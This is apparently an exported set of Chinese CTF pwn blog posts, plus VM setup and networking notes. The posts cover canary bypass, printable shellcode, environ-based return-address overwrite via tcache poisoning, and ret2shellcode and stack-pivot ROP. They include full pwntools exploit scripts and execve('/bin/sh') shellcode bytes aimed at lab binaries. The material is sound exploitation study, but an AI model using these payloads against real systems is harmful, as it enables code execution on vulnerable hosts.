用来指向内核中存储随机数的地方\n该随机数初始化于动态链接之前\n其存放于auxiliary vector 数组中 该数组是用来辅助程序运行的数据数组\n其在dl_main函数中被调用 \nElfW(Addr)_dl_sysdep_start (void **start_argptr,     void (*dl_main) (const ElfW(Phdr) *phdr, ElfW(Word) phnum,          ElfW(Addr) *user_entry, ElfW(auxv_t) *auxv))&#123;  ...  DL_FIND_ARG_COMPONENTS (start_argptr, _dl_argc, _dl_argv, _environ,         GLRO(dl_auxv));  for (av = GLRO(dl_auxv); av-&gt;a_type != AT_NULL; set_seen (av++))    ...   case AT_RANDOM:   _dl_random = (void *) av-&gt;a_un.a_val;   break;    ...  ...&#125;\n\n接着是__libc_start_main函数 其生成canary的源码如下\n// sysdeps\\unix\\sysv\\linux\\dl-osinfo.hstatic inline uintptr_t __attribute__ ((always_inline))_dl_setup_stack_chk_guard (void *dl_random)&#123;  union  &#123;    uintptr_t num;    unsigned char bytes[sizeof (uintptr_t)];  &#125; ret;  /* We need in the moment only 8 bytes on 32-bit platforms and 16     bytes on 64-bit platforms.  Therefore we can use the data     directly and not use the kernel-provided data to seed a PRNG.  */  memcpy (ret.bytes, dl_random, sizeof (ret));#if BYTE_ORDER == LITTLE_ENDIAN  ret.num &amp;= ~(uintptr_t) 0xff;#elif BYTE_ORDER == BIG_ENDIAN  ret.num &amp;= ~((uintptr_t) 0xff &lt;&lt; (8 * (sizeof (ret) - 1)));#else# error &quot;BYTE_ORDER unknown&quot;#endif  return ret.num;&#125;\n\ncanary的值和dl_random一致  只不过在最后一个字节强制使其为\\x00\n接着来到_libc_start_init函数\n  /* Set up the stack checker&#x27;s canary.  */  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);# ifdef THREAD_SET_STACK_GUARD  THREAD_SET_STACK_GUARD (stack_chk_guard);# else  __stack_chk_guard = stack_chk_guard;# endif\n\n如果设置了THREAD_SET_STACK_GUARD宏 那么canary就会被设置进入线程局部存储\nPS:一直没有搞清楚TEB TCB pthread三者的关系 上述的描述可能存在很大问题 更详细的源码级别可以看这篇博客 以我的水平很难对其进行复述\n浅析 Linux 程序的 Canary 机制 | Kiprey’s Blog\n\n在gdb中我们修改其值为0 接下一路n到函数结束前的canary判断\n\n此时只要rcx寄存器中的值与fs:0x28中的值相同  就会触发je指令 正常结束栈帧\n但是显然 此时rcx寄存器保存的是在函数最开始入栈的旧canary值 而此时fs:0x28处的值已经被我们修改为0 如果此时进行xor 显然结果是不会为0\n我们再次更改一下rcx寄存器的值 并且执行这一步异或\n此时eflags寄存器的值为\n其二进制形式为1001000110\nZF标志位是1 那么jz指令就会跳转\n于是就不会触发__stack_chk_fail函数 所以我们成功绕过了canary\n上述的绕过是基于修改主TCB中的canary 还有一种办法是修改子线程的TCB 这里不做说明\n","categories":["栈"]},{"title":"可见字符shellcode","url":"/2023/02/11/%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode/","content":"利用pwntools自带的shellcraft生成的shellcode 所消耗的字节数比较多 并且还含有很多的不可见字符\nfrom pwn import*context.arch = &quot;amd64&quot;io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;shellcode = asm(shellcraft.sh())io.send(shellcode)\n\n\n有些题目会对症下药 限制shellcode长度的题目已经屡见不鲜 本篇文章来讲一下限制字符范围的shellcode\n国际上普遍采用ascii码作为字符的编码 其中规定了95个可见字符 即打印字符 可以被直接输出 剩下的则是不可见的字符\n而pwn题中的可见字符shellcode通常指使用可见字符构成的shellcode\n这里我们需要借用alpha3这款工具来将一串不可见的字符shellcode转化为可见字符\n手动转化的办法这里就不介绍了 毕竟我也不会 哪天学会了再补充吧\n由于官方的alpha3只支持win32 在linux系统中会出现报错 需要我们修改源码 比较麻烦 再加上需要我们自己编译\n所以这里直接采用这个师傅的修改版进行下载使用\nhttps://blog.csdn.net/SmalOSnail/article/details/105236336\n\n下载指令:\ngit clone https://github.com/TaQini/alpha3.git\n\n\n其内置了两个脚本和两个文本文件\n各自对应32位和64位系统的shellcode生成脚本 我们只需要修改shellcode文本文件中的shellcode 并且指定shellcode的基地址后运行脚本\n这里使用open read write函数来写入shellcode\nfrom pwn import*context.arch = &quot;amd64&quot;f = open(&quot;/home/chen/alpha3/shellcode&quot;, &#x27;w&#x27;)shellcode = asm(shellcraft.sh())f.write(shellcode)f.close()\n\n用python2运行就好了 3的话区分了str和byte型 会导致write出错\n随后cd到alpha3目录下 .&#x2F;shellcode_x??.sh shellcode基地址\n这个基地址要怎么看  以mrctf2020_shellcode_revenge这一题为例\n\n其将shellcode的地址赋值给了rax寄存器 那么call rax 就是调用shellcode 所以我们这里的shellcode基地址应该是rax\n","categories":["栈"]},{"title":"基于Environ构造rop链","url":"/2023/03/19/%E5%9F%BA%E4%BA%8EEnviron%E6%9E%84%E9%80%A0rop%E9%93%BE/","content":"EnvironLinux C中environ 变量是一个char** 类型 存储着系统的环境变量编译下面的程序 进行一个实验 进入pwndbg我们来看一下environ指向的地址是哪里\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;void test1()&#123;  puts(&quot;test1&quot;);&#125;void test2()&#123;  puts(&quot;test2&quot;);&#125;int main()&#123;  while(1)&#123;    test1();    test2();  &#125;&#125;\n可以看到其指向的其实是栈帧高地址处的环境变量 我们s进入test1函数可以看到此时environ存储的值距离rbp非常接近 如果我们计算一下偏移 就可以得到栈帧的ret addr地址再加上任意写 就可以做到控制程序执行流\n实际利用覆盖retaddr这个办法的利用主要是在堆中 对于开启了沙盒的堆 我们只能构造orw 从而获取flag 但是如何执行rop链是一个难点 如果我们得到了ret addr地址 搭配上任意写 就可以劫持程序执行流 从而执行rop链演示环境: ubuntu22 libc依赖2.27 1.0小版本演示附件: 自己编译的 涵盖所有漏洞首先我们利用tcachebin attack 申请到指向environ的chunk (实际做题当然不局限于tcachebin attack)\nlibc_addr = gift()environ_addr = libc_addr + libc.sym[&#x27;environ&#x27;]add(0x30)#0delete(0)delete(0)edit(0,8,p64(environ_addr))add(0x30)#1add(0x30,)#2show(2)io.recv()stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))#-0x110success(&quot;stack_addr :&quot;+hex(stack_addr))\n老生常谈的操作了 不过获取libc基址的那个操作是我编写程序的时候直接给的漏洞 毕竟方便演示嘛那么 获取了栈上的一个地址 要做的当然是计算和ret addr的偏移了这时候会存在两种情况 一种rbp的值指向栈上 下一个字长就是ret addr了 直接看就好了 和泄露出来的偏移大概在0x100-0x200左右 上面的小程序就是这种情况还有一种情况是我的演示程序 其rbp并不指向栈上这种情况也别怕 断点直接打在栈帧结束前的ret指令 看一下现在的rsp是指向哪里 计算那个地址的偏移就行了如图所示 我计算出来的偏移是0x110 那就依法炮制 利用tcachebin attack任意写\ndelete(0)delete(0)edit(0,8,p64(stack_addr))add(0x30)#3add(0x30)#4onegadget_addr = libc_addr + 0x4f2c5edit(4,8,p64(onegadget_addr))\n直接同样也是图方便 直接填了个onegadget 一般是开沙盒的 或者是libc2.34以上的版本没有hook了可以看到覆盖成功了 接下来就劫持了程序执行流\n覆盖函数的retaddr这个我感觉比上面那个效果更牛逼一点 上面那种覆盖办法 直接就把程序执行流控死了 执行完你的rop链以后 如果你rop链不返回的话 就直接终止了程序这个办法是覆盖你调用的函数的retaddr 这样也就把调用函数的执行流控制了 main函数的不会当然 还是没逼用 毕竟最后都控执行流了 我们肯定就获取shell或者flag了 还要这程序执行下去什么哎呀 虽然没用 但还是看一看嘛 了解了解比如 这个时候执行一个puts函数 我们s进入单步执行到这里 继续s进去待这个子函数执行完了 他肯定要返回父函数的嘛这个时候你看rsp指针 是吧 和environ存的地址很接近的算一算偏移照样能覆盖 和上题一样的环境 来演示一下既然我们最后执行的是edit函数 所以攻击的应该是read函数的retaddr不过这里先不演示 就比如menu函数的puts函数吧 打这里断点调一下 算一下偏移 直接打\ndelete(0)delete(0)edit(0,8,p64(stack_addr))add(0x30)#3add(0x30)#4onegadget_addr = libc_addr + 0x4f2c5gdb.attach(io,&#x27;b *0x4009CF&#x27;)pause(0)edit(4,8,p64(onegadget_addr))pause()\n欸 怎么不是onegadget呢 犯蠢了吧 那你这都到main函数的执行了 你onegadget是edit函数写进去的 那这栈结构肯定又被系统写了一次 所以我们还是乖乖写read函数吧s进去 单步执行到ret是吧 照样打 算一下偏移 覆盖一下控制程序执行流成功\n","categories":["堆"]},{"title":"内联汇编对于pwn出题的一些心得","url":"/2023/02/27/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E5%AF%B9%E4%BA%8Epwn%E5%87%BA%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","content":"前言如果只运用c语言进行编写pwn题目 对于一些寄存器或者栈结构一类的没有办法操控\n这时候利用内联汇编就可以巧妙的解决问题的所在\n同时由于我想学习免杀 其中有一种利用方法为内联汇编花指令 刚好可以利用这个来打基础\n本文会伴随着本人对于内联汇编的不断学习而更新 不全面也不严谨 仅供参考\n内联函数在编写c语言时 如果你在一个函数中调用另外一个函数 其是通过call指令来进行跳转 跳转到对应函数的地址开始执行函数内容\n最后通过存储在bp寄存器中的原函数地址来返回\n比如下面这个程序\n#include &lt;stdio.h&gt;void test()&#123;      puts(&quot;hello world&quot;);&#125;int main()&#123;      test();&#125;\n\n其汇编形式如下图所示\n\n如果是一个循环调用函数 那么就会造成栈空间过于陈杂 这个时候就可以使用内联函数来解决问题\n在对应函数定义时前缀加上inline\n#include &lt;stdio.h&gt;inline void test()&#123;      puts(&quot;hello world&quot;);&#125;int main()&#123;      test();&#125;\n\n此时当main函数执行到调用test函数的时候 会直接在当前栈中执行test函数 而非跳转\n\n但是你会发现正常编译会报错未定义的函数 我们需要手动链接\n先将其编译成.o格式的文件 再进行动态链接\ngcc -O   -c -o test test.cgcc   test.o  -lgmp -o test\n\n内联汇编基本内联汇编基于上述你对内联函数的认识 那么显然易见 内联汇编就相当于我们直接往对应位置写入汇编代码 这就使得我们拥有了在程序编写的初期就拥有了操控寄存器值的能力 或者是修改栈结构 篡改程序执行流\n对于pwn题来说 常用的编译是基于GCC的 而GCC采用的是AT&amp;T&#x2F;UNIX 汇编语法\n不同的汇编语法对于内联汇编的编写格式要求不一样\n正常的一个汇编语句 比如要使得rax寄存器赋值为1 需要这样编写\nmov rax,1\n\n而受汇编语法约束的内联汇编需要这样编写\nmov $1,%rax\n\n也就是使得源操作数和目的操作数调换位置\n其中1是属于一个立即操作数 我们需要在其前面添加一个$符号 否则1会被识别为一个地址\n00001131  488b042501000000   mov     rax, qword [__elf_header.ident.signature[1]]  &#123;0x10102464c45&#125;\n\n可以看到其被识别为了ELF文件的文件头结构体中的第一个元素的第一个字节\n00000000  struct Elf64_Header __elf_header = 00000000  &#123;00000000      struct Elf64_Ident ident = 00000000      &#123;00000000          char signature[0x4] = &quot;\\x7fELF&quot;00000004          uint8_t file_class = 0x200000005          uint8_t encoding = 0x100000006          uint8_t version = 0x100000007          uint8_t os = 0x000000008          uint8_t abi_version = 0x000000009          char pad[0x7] = &quot;\\x00\\x00\\x00\\x00\\x00\\x00&quot;, 000000010      &#125;\n\n我们需要使得计算机明白1在这里是一个即时操作数 而非地址 所以需要加上$符号\n至于rax寄存器前面的%符号 是寄存器的固定格式\n同时和常规汇编一致 在操作符后面加上特定字符 可以决定操作数的字节大小 \n诸如’b’ ‘w’ ‘l’\n如果我们想要调用寄存器中的值 可以用括号将寄存器套起来\nmov (%rbx),%rax\n\n00001131  488b03             mov     rax, qword [rbx]\n\n最后 对于每行的汇编语句结束以后 都需要加上’\\t\\n‘  以此来区分每行汇编 并且每行汇编都需要加上双引号 如下:\n#include &lt;stdio.h&gt;int main()&#123;      asm(            &quot;mov (%rbx),%rax\\n\\t&quot;      );&#125;\n\n扩展内联汇编上述的基本内联汇编 往往只局限于内联汇编中的数据操作 而在扩展形式中\n我们还可以指定操作数 并且可以选择输入输出寄存器 以及指明要修改的寄存器列表\nasm ( assembler template        : output operands                /* optional */        : input operands                 /* optional */        : list of clobbered registers    /* optional */);\n\n上面是扩展内联汇编的基本格式\n第一个冒号后面指定的是输出操作数\n第二个冒号指定的是输入操作数\n第三个冒号解释起来复杂 由于内联汇编是直接插入在我们原本的函数汇编代码中 再加上我们对于寄存器的值进行了操作\n这会对正常函数的执行造成影响  所以我们需要在这里列出损坏的寄存器列表 让系统执行完内联汇编后还原一下寄存器的值 使用memory可以还原所有寄存器\nasm (            &quot;mov %1, %%rax\\n\\t&quot;            &quot;mov %%rax, %0\\n\\t&quot;            :&quot;=m&quot;(b)        /* output */            :&quot;m&quot;(a)         /* input */            :&quot;memory&quot;         /* clobbered register */      );\n\n下面我们基于上述的一段扩展内联汇编来帮助分析\n开头的两行汇编属于汇编指令部分 语法问题和基本内联汇编一致 唯一要注意的是第一行的%1是什么\n其代表的是我们引入的输入操作数a 其在整个扩展内联汇编中是第二个变量 也就是说我们想要引用输出变量b 就是%0 所以是从0开始递增的\n接着来看”&#x3D;m” 其中’&#x3D;’是约束修饰符 用来指定其为输出操作数并且是可写的\n‘m’也同为约束符 通常是用来指定这个操作数的存放\n“a”\t将输入变量放入eax“b”\t将输入变量放入ebx“c”\t将输入变量放入ecx“d”\t将输入变量放入edx“S”\t将输入变量放入esi“D”\t将输入变量放入edi“q”\t将输入变量放入eax，ebx ,ecx ，edx中的一个“r”\t将输入变量放入通用寄存器，也就是eax ，ebx，ecx,edx，esi，edi中的一个“A”\t放入eax和edx，把eax和edx，合成一个64位的寄存器(uselong longs)“m”\t内存变量“o”\t操作数为内存变量，但是其寻址方式是偏移量类型，也即是基址寻址，或者是基址加变址寻址“V”\t操作数为内存变量，但寻址方式不是偏移量类型“,”\t操作数为内存变量，但寻址方式为自动增量“p”\t操作数是一个合法的内存地址（指针）“g”\t将输入变量放入eax，ebx，ecx ，edx中的一个或者作为内存变量“X”\t操作数可以是任何类型“I”\t0-31 之间的立即数（用于32位移位指令）“J”\t0-63 之间的立即数（用于64 位移位指令）“N”\t0-255 ，之间的立即数（用于out 指令）“i”\t立即数“n”\t立即数，有些系统不支持除字以外的立即数，这些系统应该使用“n”而不是“i”“=”\t操作数在指令中是只写的（输出操作数）“+”\t操作数在指令中是读写类型的（输入输出操作数）“f”\t浮点数“t”\t第一个浮点寄存器“u”\t第二个浮点寄存器“G”\t标准的80387%\t该操作数可以和下一个操作数交换位置#\t部分注释*\t表示如果选用寄存器，则其后的字母被忽略“&amp;”\t表示输入和输出操作数不能使用相同的寄存器\n\n对于一个char数组 一般是用’m’来约束 其他的我测试是会报错 同时 只能操作一个字长的数据 超过了就不行了\n运用在pwn中泄露libc基址这个一般是用来自己方便调试的  这样可以帮助我们快速获取libc基址 \n比如我堆系列的博客用到的示例程序就使用了相同的代码来方便我快速获取libc基址 从而可以在exp中更自由的调试\nchar a[0x20];    read(0,a,0x20);    asm(        &quot;pop %rsi\\n\\t&quot;        &quot;mov $1,%rax\\n\\t&quot;        &quot;mov $1,%rdi\\n\\t&quot;        &quot;mov $8,%rdx\\n\\t&quot;        &quot;syscall\\n\\t&quot;    );\n\n原理就是利用向局部变量a中输入数据 其会被存放在栈上 同时rsp指针指向了输入的数据 这个时候调用pop指令出栈 就成功的把数据传到了寄存器rsi 这个时候调用write函数 就可以直接打印出函数真实地址了\n调整寄存器值这个办法比较简单 第一次被我利用是在出canary那一题的时候  用来调整函数结束时寄存器的值 引导解题者手写shellcode 或者进行合理的rop链构造\nasm(        &quot;mov $1,%rax\\n\\t&quot;        &quot;mov %rax,%rdi\\n\\t&quot;    );\n\n比较简单就不解释了\n","categories":["基础"]},{"title":"对于shellcode的一些理解","url":"/2022/12/19/%E5%AF%B9%E4%BA%8Eshellcode%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/","content":"仅凭一段机器码 为什么shellcode可以篡改程序执行流 使其达到我们想要的结果\n并且shellcode不同于rop链 并不能只是简单的覆盖ret addr为shellcode就可以达到效果 二者不同在哪里？\n为什么bss段如果没有可执行权限的话就不能执行shellcode 但是同样的情况下就可以通过在bss段上写入rop链 随后栈迁移来控制程序执行流？ 这些疑问一一来解决一下\n首先 什么是shellcode?\nwiki上是这样定义的:\nIn computer security, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called &quot;shellcode&quot; because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode.\n\n其是一段机器码 用来启动一个命令界面 攻击者可以用其来控制漏洞机器\n通常的shellcode长什么样？\n\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\n\n上面是一段23字节的64位shellcode 可以用来执行system(&#x2F;bin&#x2F;sh)\n编写下面的程序 并且把NX保护关闭\n#include&lt;stdio.h&gt;char magic[200];int main()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);    char a[20];    puts(&quot;this is a test&quot;);    puts(&quot;input shellcode to bss&quot;);    read(0,magic,0x200);    puts(&quot;modify the retaddr&quot;);    read(0,a,0x200);&#125;\n\n向bss段中写入shellcode 并且修改retaddr为magic数组的首地址\n但是如果想要直接覆盖ret addr为shellcode那么就无法达到同样的攻击效果\n这是因为覆盖ret addr 实际上利用栈帧结束后 自带的两行指令 leave 和ret(外平栈)\n来使esp和ebp指针指向父函数的栈帧 继续执行上一步操作 也就是说 ret add需要是一个地址 指向一连串的指令或者是shellcode这样的字节流数据\n当然了 也正是出于栈帧的这种回归到父函数的操作 延申出了一种栈溢出手法叫做 栈迁移\n下文不做基础解释 而是进行一个额外的知识扩展\nfrom pwn import*io = process(&quot;./a.out&quot;)context.arch = &quot;amd64&quot;shellcode = b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;io.recvuntil(&quot;input shellcode to bss&quot;)io.sendline(shellcode)bss_addr = 0x601060io.recvuntil(&quot;modify the retaddr&quot;)payload = cyclic(0x28)+p64(bss_addr)io.sendline(payload)io.interactive()\n\n如果打开NX保护 也就是使bss段不可执行 那么shellcode就无法执行\n但是如果我们将bss段中的数据改为一串rop链 通过栈迁移的办法 看能不能实现系统调用\n#include&lt;stdio.h&gt;char magic[200];int main()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);    char a[20];    system(&quot;echo this is a test&quot;);    puts(&quot;/bin/sh gift!&quot;);    puts(&quot;input shellcode to bss&quot;);    read(0,magic,0x200);    puts(&quot;modify the retaddr&quot;);    read(0,a,0x200);&#125;\n\n给了system函数和字符串&#x2F;bin&#x2F;sh 很简单的rop64 不过我们不用覆盖ret addr来做 我们在bss段中构造rop链 然后栈迁移 注意此时NX保护打开了\nfrom pwn import*io = process(&quot;./a.out&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;io.recvuntil(&quot;input shellcode to bss&quot;)rdi_addr = 0x400753binsh_addr = 0x400788bss_addr = 0x601080system_addr = 0x400520leave_addr = 0x4006ebret_addr = 0x4004fegadget1_addr = 0x400730payload = p64(ret_addr)*100+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.send(payload)io.recvuntil(&quot;modify the retaddr&quot;)payload = cyclic(0x20)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)io.interactive()\n\n唯一不好理解的地方在于为什么要多出来一百个字长的ret指令 首先 外平栈中ret指令相当于pop eip\n弹出了一个栈空间 所以相当于往低地址的方向抬高栈顶\n其次 我们需要明白为什么需要抬高栈顶 如果我们不抬的话会出现什么问题？\n下面是没有p64(ret_addr)*100的情况 我们用pwndgb来查看一下此时的栈\n\n我们本来是想要将栈迁移至0x601080 但是此时指向了0x600f00\nLOAD:0000000000600F00                 Elf64_Dyn &lt;2, 60h&gt;      ; DT_PLTRELSZLOAD:0000000000600F10                 Elf64_Dyn &lt;14h, 7&gt;      ; DT_PLTRELLOAD:0000000000600F20                 Elf64_Dyn &lt;17h, 400488h&gt; ; DT_JMPRELLOAD:0000000000600F30                 Elf64_Dyn &lt;7, 400428h&gt;  ; DT_RELALOAD:0000000000600F40                 Elf64_Dyn &lt;8, 60h&gt;      ; DT_RELASZLOAD:0000000000600F50                 Elf64_Dyn &lt;9, 18h&gt;      ; DT_RELAENTLOAD:0000000000600F60                 Elf64_Dyn &lt;6FFFFFFEh, 400408h&gt; ; DT_VERNEEDLOAD:0000000000600F70                 Elf64_Dyn &lt;6FFFFFFFh, 1&gt; ; DT_VERNEEDNUMLOAD:0000000000600F80                 Elf64_Dyn &lt;6FFFFFF0h, 4003F6h&gt; ; DT_VERSYMLOAD:0000000000600F90                 Elf64_Dyn &lt;0&gt;           ; DT_NULL\n\nida一般以load段中的内容来解析二进制文件 但是为什么esp会指向这里呢？\n此时的栈帧空间迁移到了bss段 但是栈是由高地址往低地址处写 而bss段上方不远处是got表 很明显不能这样篡改got表\n因为程序无法完成正常的栈迁移 如果你尝试过往test段迁移 就不会出现这种情况\n所以这里利用ret指令抬高栈顶 跨过got表 就可以成功栈迁移 \n同理 如果我们写入的bss段处地址离got表远一点  也可以达到同样的效果 如果你有做过一些栈迁移的题目 你会发现网上的exp迁移至的地址往往会偏差几百个字节 也是同理\nfrom pwn import*io = process(&quot;./a.out&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;io.recvuntil(&quot;input shellcode to bss&quot;)rdi_addr = 0x400753binsh_addr = 0x400788bss_addr = 0x601080+0x300system_addr = 0x400520leave_addr = 0x4006ebret_addr = 0x4004fegadget1_addr = 0x400730payload = cyclic(0x300)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.send(payload)io.recvuntil(&quot;modify the retaddr&quot;)payload = cyclic(0x20)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)io.interactive()\n\n这里说个题外话 这种因为bss段和got表近导致的情况还是很常见的 在出unlink题目的时候 也会遇到这种情况 不能做到任意写 但是可以通过出题的时候多声明一个全局数组 使其位于任意写的数组低地址处 详见以往的博客\n至此 我们可以浅显的得出一个结论：\n1.当程序没有开启NX保护的时候 并且我们得知栈地址或者bss段地址(人话:写入shellcode的地址) 可以通过ret2shellcode来解决题目\n2.当程序没有打开NX保护 并且栈溢出的长度仅仅只有覆盖ret addr的长度 而且我们拥有往bss段(或者是rw-p权限的空间 即可读可写)\n我们可以通过往该空间写入rop链 随后劫持esp和ebp栈迁移\n要素在于理解说shellcode不同于rop链 其是一串字节流 可以达到特殊命令的字节流 \n同时 在日后的题目中  要小心因为bss段和got表过于近而导致的栈空间出错 并能意识到这个问题\n","categories":["基础"]},{"title":"复制粘贴问题解决","url":"/2022/09/30/%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/","content":"Ubuntu20.04无法安装vmtools 或者出现安装了也没办法做到物理机和虚拟机复制粘贴共用\n所以这里我们用open-vm-tools 这是一个vmtools官方承认的开源工具\n其一样可以起到vmtools的作用\n第一步输入下面的指令\nsudo apt-get autoremove open-vm-tools\n\n第二步我们输入\nsudo apt-get install open-vm-tools-desktop\n\n但是很遗憾 会出现这样的问题\n\n这时候我们需要更改一下下载源\n\n网上的方法是说在这里搜索software-update 但是我查看了以后发现找不到\n最后找到的解决办法是\n\n因为还没有安装输入法 所以只能先输入set 然后打开设置\n\n一直向下滑 直到看到关于 点进去 找到软件更新 再点进去\n\n如图所示 点开后选择other(也可能显示成其他 看你刚创建虚拟机时的语言选择)\n\n这里挑一个选 我选择的是阿里云的 \n!\n退出的时候会提醒你这个 直接点重新载入就好了\n\n在终端中输入\nsudo apt-get update\n\n然后我们再输入\nsudo apt-get install open-vm-tools-desktop\n\n发现就可以了\n安装完成之后 在终端输入\nreboot\n\n重启一下虚拟机 发现就可以做到物理机和虚拟机复制粘贴互通了\n","categories":["虚拟机"]},{"title":"小林图解网络笔记","url":"/2022/12/18/%E5%B0%8F%E6%9E%97%E5%9B%BE%E8%A7%A3%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/","content":"声明本文如标题所说 是小林图解网络的笔记 所以内容大部分都是我复制粘贴于原文的 只是我个人绝对有必要记住 重要的内容\n如果想要了解网络基础 建议看原文\nhttps://xiaolincoding.com/network/\n2.1TCP&#x2F;IP网络模型的存在是因为为了跨设备进程通信 但是设备存在多样性 所以为了兼容 推出一套通用的网络协议\n协议分层: 应用层 传输层 网络层 网络接口层\n每层各司其职 在网络层中\n使用ip地址来区分设备 分为网络号和主机号 网络号用来标识属于哪个子网 主机号标识具体主机\n2.2浏览器是如何实现打开一个网页 和服务器进行交互的？\n1.解析URL后 生成http请求消息\n2.通过DNS服务器来查询对应域名的ip地址\n3.http的传输工作是交给操作系统中的协议栈\n浏览器通过socker库来委托协议栈工作  协议栈上半部分有两块协议 分别为TCP和UDP\nTCP比UDP多很多特性 为了能够保证数据包传输到对方 而UDP只保证发送数据包 但是传输效率高\n协议栈的下半部分是IP协议控制的 将数据分成一块块的网络包\n物理硬件网卡就是负责完成实际的手法操作 而IP下面的网卡驱动程序就是控制网卡硬件\n其中IP还包括两个协议 ICMP 和 ARP\nARP用于根据ip地址查询相应的以太网mac地址\nICMP用于报错和控制信息的报告\nHTTP默认端口是80 HTTPS默认端口号是443\n清楚一点 TCP传输数据还是通过IP来 TCP这是一种传输协议\n目标地址和子网掩码都是0.0.0.0的话 是默认网关 如果其他的所有条目都不能匹配的话 就会自动匹配默认网关\n4.生成了IP头部后 还需要加上MAC头部 MAC头部是在同一以太网中通过广播和缓存来获取对应路由器的MAC地址\n5.通过网卡来将数字信号转化为电信号 因为网络包实际上存放在内存中的一串二进制数字信息 没有办法直接发送给对方 \n6.交换机根据MAC地址查找 将信号发送到相应的端口\n如果没有找到对应的端口 就将包发送到所有端口\n还有一种MAC地址称为广播地址 交换机会将这个包发送到除了源端口以外的所有端口\n\nMAC 地址中的 FF:FF:FF:FF:FF:FF\nIP 地址中的 255.255.255.255\n\n7.经过交换机后来到路由器\n8.服务器接收到了数据包 开始拆快递 一层一层进行核验 然后解析出来是HTTP相应报文 就交给浏览器去渲染页面\n2.3为了解决不同设备之间的通信 以及在网络互联中的兼容性问题 国际标准化组织制定了开放式系统互联通信参考模型 即OSI网络模型\n一共有七层 分别是应用层、表示层、会话层、传输层、网络层、数据链路层以及物理层\n\n应用层，负责给应用程序提供统一的接口；\n表示层，负责把数据转换成兼容另一个系统能识别的格式；\n会话层，负责建立、管理和终止表示层实体之间的通信会话；\n传输层，负责端到端的数据传输；\n网络层，负责数据的路由、转发、分片；\n数据链路层，负责数据的封帧和差错检测，以及 MAC 寻址；\n物理层，负责在物理网络中传输数据帧；\n\n但是由于其过于复杂  且仅仅只是概念上的提出 没有具体的实施方案 实际上使用多的是TCP|IP 模型 Linux系统正是按照这套模型实施网络协议栈的\n网络协议栈是指网络中各层协议的总和，其形象的反映了一个网络中数据传输的过程：由上层协议到底层协议，再由底层协议到上层协议\nTCP|IP网络模型一共有四层 分别是应用 传输 网络 网络接口层\n\n应用层，负责向用户提供一组应用程序，比如 HTTP、DNS、FTP 等;\n传输层，负责端到端的通信，比如 TCP、UDP 等；\n网络层，负责网络包的封装、分片、路由、转发，比如 IP、ICMP 等；\n网络接口层，负责网络包在物理网络中的传输，比如网络包的封帧、 MAC 寻址、差错检测，以及通过网卡传输网络帧等；\n\n在以太网中 规定了最大传输单元MTU 为1500字节 也就是说单个IP包大小最多为1500字节\n当网络包超过了MTU 那就需要分片 如果MTU越小 需要的分包越多 那么网络吞吐能力越差 反之\n下图是Linux网络协议栈的流程 \n\nLVS补充: LVS主要用于多服务器的负载均衡。它工作在网络层，可以实现高性能，高可用的服务器集群技术。\n它廉价，可把许多低性能的服务器组合在一起形成一个超级服务器。\n它易用，配置非常简单，且有多种负载均衡的方法。它稳定可靠，即使在集群的服务器中某台服务器无法正常工作，也不影响整体效果。\n另外可扩展性也非常好\nlinux中的lvs的作用,LVS是什么及作用？ - osc_ozlday8e的个人空间 - OSCHINA - 中文开源技术交流社区…_皮小只的博客-CSDN博客\n从上图的的网络协议栈，你可以看到：\n\n应用程序需要通过系统调用，来跟 Socket 层进行数据交互；\nSocket 层的下面就是传输层、网络层和网络接口层；\n最下面的一层，则是网卡驱动程序和硬件网卡设备；\n\n当网卡接收到了一个网络包后 通过DMA技术将网络包写入到对应的内存地址 也就是Ring Buffer 接着告诉操作系统这个网络包已经抵达\nDMA传输将数据从一个地址空间复制到另一个地址空间，提供在外设和存储器之间或者存储器和存储器之间的高速数据传输\n每当网卡接收到一个网络包 就会触发中断告诉操作系统已经接收到了网络包\n但是如果网络包的数量非常多 就会频繁触发中断 导致cpu一直处理中断 影响其他进程的执行\n所以为了解决频繁中断带来的性能开销，Linux 内核在 2.6 版本中引入了 NAPI 机制\n它是混合「中断和轮询」的方式来接收网络包，它的核心概念就是不采用中断的方式读取数据，而是首先采用中断唤醒数据接收的服务程序，然后 poll 的方法来轮询数据。\n因此，当有网络包到达时，会通过 DMA 技术，将网络包写入到指定的内存地址，接着网卡向 CPU 发起硬件中断，当 CPU 收到硬件中断请求后，根据中断表，调用已经注册的中断处理函数\n发送网络包的话 会从用户态进入内核态 内核会申请一个内核态的sk_buff 内存 用用户发送的数据拷贝到sk_buff 内存 并将其传输到发送缓存区\n接下来，网络协议栈从 Socket 发送缓冲区中取出 sk_buff，并按照 TCP&#x2F;IP 协议栈从上到下逐层处理。\n如果使用的是 TCP 传输协议发送数据，那么先拷贝一个新的 sk_buff 副本 